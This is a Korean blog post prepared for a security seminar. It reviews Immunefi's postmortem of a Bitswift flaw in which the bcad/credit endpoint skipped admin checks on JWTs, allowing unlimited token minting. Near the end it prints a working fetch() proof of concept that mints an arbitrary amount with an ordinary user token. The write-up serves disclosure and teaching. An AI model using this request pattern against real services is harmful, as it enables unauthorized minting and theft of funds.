---
title:  "Bitswift Unlimited Mint Bugfix Postmortem 리뷰"
excerpt: "Immunefi Bitswift Unlimited Mint Bugfix Postmortem 문서 학습 목적으로 살펴본 내용임"

author: Panda
categories:
  - Security
  - Blockchain
tags:
  - Web
  - Logical Bug
  - Medium Severity
  - Korean
#last_modified_at: 2021-09-23 18:06:00 +09:00
date: 2022-02-17 19:00:00 +09:00
lastmod: 2022-02-17 19:00:00 +09:00
sitemap :
changefreq : daily
priority : 1.0

# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정

#{% figure caption:"Le logo de **Jekyll** et son clin d'oeil à Robert Louis Stevenson"
#  %}
#  ![Le logo de Jekyll]({{"/assets/images_posts/2021-09-23-cve-2021-31956-part1/1.png"| #relative_url}})
#{% endfigure %}
---
# Executive Summary
이 문서는 Immunefi사의 기술 블로그중 [Bitswift Unlimited Mint Bugfix Postmortem](https://medium.com/immunefi/bitswift-unlimited-mint-bugfix-postmortem-147a1e57dca9) 문서를 읽고 BEARS 팀내 기술 세미나 자료로 활용하기 위해 작성되었으며, 해당 블로그 내용 공유를 통해 Smart Contract내 취약점 유형을 학습하는데 중점을 두고 작성된 문서입니다.

# Background
## Bitswift(BITS)
* 캐나다 소재 블록체인 기술 기업 주관의 프로젝트(블록체인 네트워크)
  * 국내 회사 [블록체인랩스](https://infrablockchain.com/ko)와 사업 영역이 비슷하게 느껴짐
  * 블록체인랩스는 COOV와 같은 정부 과제를 블록체인기반 솔류션을 제공하는 것을 목표로함
* 기존 사업영역에 블록체인 기술을 제공하는 것이 주요 사업임
* 블록체인 네트워크는 2014년에 런칭됨
* BITS(Bitswift 토큰)은 Bitswift 블록체인과 Bitswift사에서 직접 제공하는 서비스 Bitswift 캐시(크립토 케이트웨이 서비스) 및 관련 제품에 활용됨
  * Bitswift Forging Pool(LZLZ)
  * Bitswift Cash : 다른 다양한 블록체인 네트워크에 접속할 수 있는 게이트웨이 서비스
  * NFTMagic ART : BITS를 지원하는 NFT 시장
  * Sigbro : Ignis, ARDR에 서명된 트랜젝션을 전송할 수 있는 모바일앱

# Introduction
* 2021.12.8.에 보안전문가 Immunefi에 버그 제보
* 제보한 버그는 BCAD 토큰을 무한히 민팅할 수 있고, 해당 토큰을 이용해 지금 liquid 풀에서 다른 토큰을 빼올 수 있음
* Bitswift사는 4,515달러를 보안전문가에게 지급하고 해당 취약점 패치
* 결론부터 이야기 하면 취약점이 너무 단순하기 때문에, 개발자의 실수라고 밖에 생각할 수 없는 그러한 취약점임

# Vulnerability
## Introduction to JWT
* JWT에 대해서는 추가적으로 기술 조사를 별도로 실시 예정(점진적으로 보완), [JSON Web Token관련 공격 블로그](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)도 확인하여 정리실시할 예정임
* JWT는 서버와 클라이언트(브라우저)간 신뢰할 수 있는 정보를 전달하는 목적으로 사용됨
* 아래 그림과 같이 사용자가 ID와 패스워드를 포스트(post) 프로토콜로 전달후, 인증이 성공적으로 통과하면 그림2와 같은 JWT 토큰을 받게 된다.

| ![Image Alt 텍스트]({{"/assets/images_post/2022-02-17-immunefi-bitswift-review/post_request.png"| relative_url}})  |
|:--:| 
| 그림.1 ID, 패스워드 POST REQUEST |


| ![Image Alt 텍스트]({{"/assets/images_post/2022-02-17-immunefi-bitswift-review/jwt_token.png"| relative_url}})  |
|:--:| 
| 그림.2 인증을 통과후 사용자가 받는 JWT 토큰 |

이 후에 사용자가 서비스를 접근할 때 해당 서비스 서버는 헤더의 JWT 속성을 보고 해당 사용자에 대한 서비스 접근 제어를 하게 된다.

| ![Image Alt 텍스트]({{"/assets/images_post/2022-02-17-immunefi-bitswift-review/jwt_header.png"| relative_url}})  |
|:--:| 
| 그림.3 HTML 헤더내 JWT 토큰기반 접근 제어 |

결국 JWT 토큰은 인증 정보를 가지고 다는 것이 되며, JWT 토큰은 주로 프로트엔드 코드내 HTML5 표준에 정의되어 있는 `localstorage` 에 저장된다.

| ![Image Alt 텍스트]({{"/assets/images_post/2022-02-17-immunefi-bitswift-review/jwt_localstorage.png"| relative_url}})  |
|:--:| 
| 그림.4 localstorage에 저장된 JWT 토큰 |

## Bitswift Issue
그럼, 다시 Bitswift 취약점으로 돌아가보자.  
Bitswift는 관리자와 일반 사용자를 구분하기 위해 JWT 토큰을 자기들 서비스에 도입하였다.
서비스 종단에서는 해당 서비스 요청자가 관리자 여부를 확인함으로써 기능을 제한하겠다는 의도로 도입한 것이다.  
그런데 정말 아쉽게도, bcad/credit의 서비스 종단에서는 어떠 권한 확인도 하지 않는다는 것이다. 즉 JWT 토큰을 도입해 놓고 실제로 사용을 하지 않은 것이다.  

```json
{
  “admin”: false,
  “aud”: [
    2625,
    “bitswift.cash”
  ],
  “exp”: 1639641831,
  “iat”: 1639638231,
  “iss”: “bitswift.cash”,
  “jti”: “5tpR-bagAJO4aerV8iFHN5CzVRf_zXdXGVRQjRPwbvU=”,
  “nbf”: 1639638231,
  “sub”: 2625,
  “username”: “immunefi”,
  “verified”: false
}
```

아래 코드는 BCAD내 사용자 인증정보에 대해서 확인하는 함수인데, 해당 사용자가 보유한 Token의 권한이  
admin인지 일반 사용자인지 여부는 관계 없이 해당 토큰이 정상적인 토큰이면, 통과하게 된다.  

```javascript
async confirmCreditSubmit(e) {
    e.preventDefault();
    const multiplier = new BigNumber(1000000);
    const userAmount = new BigNumber(this.state.amount).multipliedBy(multiplier);
    const res = await this.props.apiClient.BCADCredit({
      amount: userAmount.toNumber(),
      unique_message: this.props.user.unique_message,
    }, this.user.accessToken)
    if (res.success === true) {
      this.setState({
        modal: false,
        confirmModal: false,
      });
    } else {
      this.setState({
        error: `Failed to credit BCAD to the user${res.msg ? ‘: ‘ + res.msg : ‘’}`
      });
    }
 }
```

따라서 아래와 같은 취약점을 유발할 수 있는 POST 메세지를 전달하면, 인증을 통과하고 우리가 원하는 갯수만큼  
토큰을 생성(민팅)할 수 있다.

```javascript
let res = await fetch(‘https://bitswift.cash:8443/bcad/credit', {
    method: ‘POST’,
    mode: ‘cors’,
    headers: {
        ‘Content-Type’: ‘application/json’,
        ‘Authorization’: ‘Bearer ‘ + token
    },
    body: JSON.stringify({
      amount: 9999999999999999,
      unique_message: “9C83C69E98A7152693E3AB357649744765456614”, //use your account’s unique message
    }),
    redirect: ‘follow’,
    referrer: ‘no-referrer’,
});
res = await res.text();
console.log(res); //success, despite not being an admin
```

해당 취약점의 경우 Bitswfit사로 부터 $4500 밖에 못 받았는데, 실제적으로 토큰을 새로 생성후  
탈취하는 취약점을 못 찾았기 때문에 금액이 작게 책정된 것이 아닌가?라는 생각이 들었다.

# Lesson
* 아직 블록체인 관련 서비스를 살펴보면 기존 웹영역 PT(Pen-Testing)보다 적은 노력으로 취약점을 발견할 수 있는 기회가 있다.라는 생각이 드는 사례라고 생각합니다.
* 기존 웹서비를 생각하고 설마 이런 것 까지 취약점이 있을까? 라는 선입견을 버리고, 핵심 기능부분은 꼼곰하게 분석하면 정말 쉽게 취약점을 찾을 수 있을 것으로 판단이 됩니다.

# References
* Bitswift 관련 사이트
  *  [https://bitswift.io](https://bitswift.io)
  *  [https://bitswift.tech](https://bitswift.tech/)
  *  [https://bitswift.cash/](https://bitswift.cash/)
  *  [https://nftmagic.art/](https://nftmagic.art/)
  *  [https://bitswift.cash/explorer/blocks](https://bitswift.cash/explorer/blocks)
  *  [https://myaccount.bitswift.network/index.html](https://myaccount.bitswift.network/index.html)
* [https://medium.com/immunefi/bitswift-unlimited-mint-bugfix-postmortem-147a1e57dca9](https://medium.com/immunefi/bitswift-unlimited-mint-bugfix-postmortem-147a1e57dca9)
* [https://infrablockchain.com/ko](https://infrablockchain.com/ko)
* [Hacking JSON Web Token(JWT)](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)